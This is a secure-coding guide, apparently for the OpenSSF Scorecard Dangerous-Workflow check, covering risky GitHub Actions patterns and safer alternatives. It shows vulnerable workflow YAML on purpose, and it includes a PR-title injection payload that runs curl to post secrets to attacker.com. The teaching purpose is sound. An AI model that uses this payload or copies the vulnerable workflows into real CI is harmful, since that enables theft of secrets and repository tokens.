# Dangerous-Workflow Check

!!! tip "Key Insight"
    Dangerous workflows can leak secrets or enable code injection attacks.

## Dangerous-Workflow

**Target**: 10/10 by eliminating dangerous workflow patterns

**What it checks**: Workflows that could leak secrets, execute untrusted code, or be exploited for privilege escalation.

**Why it matters**: Pull requests from external contributors can inject malicious code into workflows. A single misconfigured workflow can leak GitHub tokens or secrets.

### Dangerous Pattern 1: `pull_request_target` with Code Checkout

**The vulnerability**:

```yaml
name: PR Check

on:
  pull_request_target:  # Runs with write permissions

jobs:
  test:
    permissions:
      contents: write  # Can push to protected branches!
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@b4ffde65f46336ab88eb53be808477a3936bae11
        with:
          ref: ${{ github.event.pull_request.head.sha }}  # DANGEROUS!
      - run: npm install  # Executes attacker's package.json scripts!
      - run: npm test     # Executes attacker's test code!
```

**Attack scenario**:

1. Attacker opens PR with malicious `package.json` that exfiltrates `GITHUB_TOKEN` in postinstall script
2. Workflow runs with write permissions (because `pull_request_target`)
3. Malicious script pushes backdoor to main branch or exfiltrates secrets

**Scorecard result**: Dangerous-Workflow 0/10

### Safe Pattern: `pull_request` for Untrusted Code

```yaml
name: PR Check

on:
  pull_request:  # Read-only by default

jobs:
  test:
    permissions:
      contents: read  # Minimal permissions
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@b4ffde65f46336ab88eb53be808477a3936bae11
        # Automatically checks out PR head
      - run: npm install
      - run: npm test
```

**Why safe**:

- `pull_request` has read-only permissions by default
- Even if attacker exfiltrates `GITHUB_TOKEN`, it can't write to repository
- No access to repository secrets

### When to Use `pull_request_target`

**Valid use case**: Commenting on PRs or updating PR status checks.

**Safe pattern**:

```yaml
name: PR Comment

on:
  pull_request_target:

jobs:
  comment:
    permissions:
      pull-requests: write  # Only PR comments, not repo write
    runs-on: ubuntu-latest
    steps:
      # DO NOT checkout PR code
      - run: |
          gh pr comment ${{ github.event.pull_request.number }} \
            --body "Thank you for your contribution!"
        env:
          GH_TOKEN: ${{ github.token }}
```

**Critical rules**:

1. Never checkout PR code (`actions/checkout`)
2. Never install dependencies from PR
3. Never run scripts from PR
4. Only use for metadata operations (comments, labels, status checks)

### Dangerous Pattern 2: Inline Scripts with Untrusted Input

**The vulnerability**:

```yaml
- name: Echo PR Title
  run: echo "PR title: ${{ github.event.pull_request.title }}"
```

**Attack scenario**:

Attacker creates PR with title:

```text
Fix bug"; curl -X POST https://attacker.com -d "$SECRETS" #
```

**Executed command**:

```bash
echo "PR title: Fix bug"; curl -X POST https://attacker.com -d "$SECRETS" #"
```

**Result**: Secrets exfiltrated to attacker server.

### Safe Pattern: Environment Variables

```yaml
- name: Echo PR Title
  env:
    PR_TITLE: ${{ github.event.pull_request.title }}
  run: echo "PR title: $PR_TITLE"
```

**Why safe**: Environment variables are not subject to shell injection. Special characters are escaped.

### Dangerous Pattern 3: Secrets in Pull Request Workflows

**The vulnerability**:

```yaml
on:
  pull_request:

jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@b4ffde65f46336ab88eb53be808477a3936bae11
      - run: echo "API Key: ${{ secrets.API_KEY }}"  # LEAKED!
```

**Attack scenario**:

1. Attacker opens PR
2. Adds `cat $GITHUB_ENV` to see environment
3. Workflow logs show all secrets in plaintext

**Safe pattern**: Never use secrets in workflows triggered by untrusted PRs.

```yaml
on:
  pull_request:

jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@b4ffde65f46336ab88eb53be808477a3936bae11
      - run: npm test
      # NO SECRETS used
```

If you need secrets for testing:

```yaml
on:
  push:  # Only on trusted branches
    branches: [main]

jobs:
  integration-test:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@b4ffde65f46336ab88eb53be808477a3936bae11
      - run: npm run integration-test
        env:
          API_KEY: ${{ secrets.API_KEY }}  # Safe - only runs on main
```

### Dangerous Pattern 4: Self-Hosted Runners on Public Repos

**The vulnerability**:

```yaml
jobs:
  build:
    runs-on: self-hosted  # DANGEROUS on public repos
```

**Attack scenario**:

1. Attacker opens PR to public repository
2. Workflow runs on your internal self-hosted runner
3. Attacker's code executes inside your network
4. Lateral movement to internal systems

**Safe pattern**: Only use self-hosted runners on private repositories.

```yaml
jobs:
  build:
    runs-on: ubuntu-latest  # GitHub-hosted, isolated
```

### Workflow Audit Checklist

Run through these for every workflow:

- [ ] `pull_request_target` workflows never checkout PR code
- [ ] Untrusted input always passed via environment variables
- [ ] No secrets in PR workflows
- [ ] Self-hosted runners only on private repos
- [ ] Job-level permissions (not workflow-level)
- [ ] Minimal permissions per job

### Troubleshooting

#### Need to run tests with secrets on PR

**Solution**: Two-stage workflow.

```yaml
# Stage 1: PR validation (no secrets)

on:
  pull_request:

jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@b4ffde65f46336ab88eb53be808477a3936bae11
      - run: npm test  # Unit tests, no secrets

---

# Stage 2: Integration tests (with secrets)

on:
  push:
    branches: [main]

jobs:
  integration:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@b4ffde65f46336ab88eb53be808477a3936bae11
      - run: npm run integration-test
        env:
          API_KEY: ${{ secrets.API_KEY }}
```

#### Scorecard flagging safe pull_request_target workflow

**Check**: Are you checking out PR code? If yes, that's dangerous.

**Check**: Are you running PR scripts? If yes, that's dangerous.

**If neither**: This might be a false positive. Document the safe pattern in PR description.

---
